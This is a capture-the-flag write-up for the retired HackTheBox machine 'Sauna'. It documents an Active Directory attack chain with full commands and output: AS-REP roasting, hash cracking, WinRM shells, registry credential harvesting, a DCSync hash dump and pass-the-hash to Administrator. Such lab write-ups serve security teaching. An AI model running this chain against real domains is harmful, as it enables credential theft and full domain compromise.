# Sauna — HackTheBox

**Active Directory · Easy · Windows**

| | |
|---|---|
| **Target** | 10.129.29.7 — SAUNA.EGOTISTICAL-BANK.LOCAL |
| **Domain** | EGOTISTICAL-BANK.LOCAL |
| **Foothold** | AS-REP Roasting → fsmith |
| **Privilege Escalation** | Winlogon cleartext creds → svc_loanmgr → DCSync |
| **Result** | Domain Admin |

---

## Attack Chain

| # | Step | Result |
|---|---|---|
| 01 | Nmap | AD box, WinRM open, IIS site on port 80 |
| 02 | Website — About Us page | 6 employee names scraped |
| 03 | AS-REP Roasting | fsmith hash |
| 04 | Hashcat -m 18200 rockyou | `fsmith:Thestrokes23` in ~10 seconds |
| 05 | Evil-WinRM | Shell as fsmith |
| 06 | SharpHound + BloodHound | Domain graph, svc_loanmgr has DCSync |
| 07 | Winlogon registry | `svc_loanmgr:Moneymakestheworldgoround!` in cleartext |
| 08 | impacket-secretsdump | Full NTLM dump via DCSync |
| 09 | Pass-the-Hash | Administrator shell, root flag |

---

## Recon

Standard AD enumeration first. Add the host, sync the clock (nmap showed a 7-hour skew — Kerberos will reject anything outside 5 minutes), then scan.

```bash
echo "10.129.29.7 EGOTISTICAL-BANK.LOCAL sauna.EGOTISTICAL-BANK.LOCAL sauna" | sudo tee -a /etc/hosts
sudo ntpdate -u 10.129.29.7
nmap -sC -sV 10.129.29.7
```

Nothing surprising — standard AD ports. The interesting ones:

| Port | Service |
|---|---|
| 80 | IIS 10.0 — corporate website |
| 88 | Kerberos |
| 389 / 3268 | LDAP — domain `EGOTISTICAL-BANK.LOCAL` |
| 5985 | WinRM — direct shell if we get creds |

Anonymous LDAP bind works but returns no user objects. The website is the way in.

```bash
gobuster dir -u http://10.129.29.7 -w /usr/share/wordlists/dirb/common.txt -x html,aspx,txt -t 40
```

Only static HTML pages — `/about.html`, `/blog.html`, `/contact.html`. Nothing exploitable on the web side.

---

## Username Enumeration from the Website

The About Us page lists the team members with full names. On an AD box this is exactly what you need to start building a username list.

**Names found:**

- Fergus Smith
- Shaun Coins
- Hugo Bear
- Bowie Taylor
- Sophie Driver
- Steven Kerb

Generated a wordlist covering the most common AD naming conventions:

```bash
cat > users.txt << 'EOF'
fsmith
scoins
hbear
btaylor
sdriver
skerb
f.smith
s.coins
h.bear
b.taylor
s.driver
s.kerb
fergus.smith
shaun.coins
hugo.bear
bowie.taylor
sophie.driver
steven.kerb
EOF
```

---

## AS-REP Roasting

When an account has pre-authentication disabled, the KDC will hand out a TGT fragment encrypted with that user's key — no password needed to ask for it. That encrypted blob is offline-crackable.

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ \
  -usersfile users.txt \
  -no-pass \
  -dc-ip 10.129.29.7 \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

Only `fsmith` responds with a hash. Everyone else gets `KDC_ERR_C_PRINCIPAL_UNKNOWN`.

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:0cf625923cceca949e62b34a46a3431d$...
```

Crack it:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Done in 10 seconds:

```
fsmith : Thestrokes23
```

---

## Foothold

```bash
evil-winrm -i 10.129.29.7 -u fsmith -p 'Thestrokes23'
```

```powershell
whoami /all
```

`fsmith` is in `Remote Management Users`, `Medium Plus` integrity. No interesting privileges — no `SeImpersonate`, no `SeDebug`. Need to look elsewhere.

---

## BloodHound

Upload SharpHound and run a full collection:

```powershell
upload /path/to/SharpHound.exe
.\SharpHound.exe -c All --zipfilename sauna_bh.zip
download <timestamp>_sauna_bh.zip
```

```bash
sudo neo4j start
bloodhound &
# drag and drop the zip
```

The graph shows `SVC_LOANMGR` with DCSync rights on the domain object — `GetChanges` and `GetChangesAll`. That means if we can get to that account, we own the domain. Keep it in mind.

Also from `net user /domain`: accounts are `Administrator`, `FSmith`, `HSmith`, `krbtgt`, `svc_loanmgr`.

---

## Cleartext Credentials in the Registry

Before going down any complicated path, check the obvious stuff. AutoLogon credentials are frequently left in the Winlogon registry key:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

There it is. `svc_loanmgr` in cleartext.

---

## DCSync

`svc_loanmgr` has DCSync rights confirmed by BloodHound. No need to touch the machine — run secretsdump directly from Kali:

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.29.7
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:...:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:...:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:...:9cb31797c39a9b170b04058ba2bba48c:::
```

---

## Administrator

Pass-the-Hash:

```bash
evil-winrm -i 10.129.29.7 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

```powershell
type C:\Users\FSmith\Desktop\user.txt
# [REDACTED]

type C:\Users\Administrator\Desktop\root.txt
# [REDACTED]
```

---

## Notes

**Clock skew.** Kerberos tolerates 5 minutes max. This box had a 7-hour offset — sync with `ntpdate` before anything Kerberos-related or everything will fail silently.

**Winlogon AutoLogon.** Service accounts set up for autologon store their password in cleartext at `HKLM\...\Winlogon`. Worth checking immediately after foothold on any Windows box.

**DCSync.** Abuses AD replication APIs. You don't need local access to the DC — just an account with `GetChanges` + `GetChangesAll`. secretsdump handles the rest over the network.

---

*Sauna is a retired HackTheBox machine — published for educational purposes.*
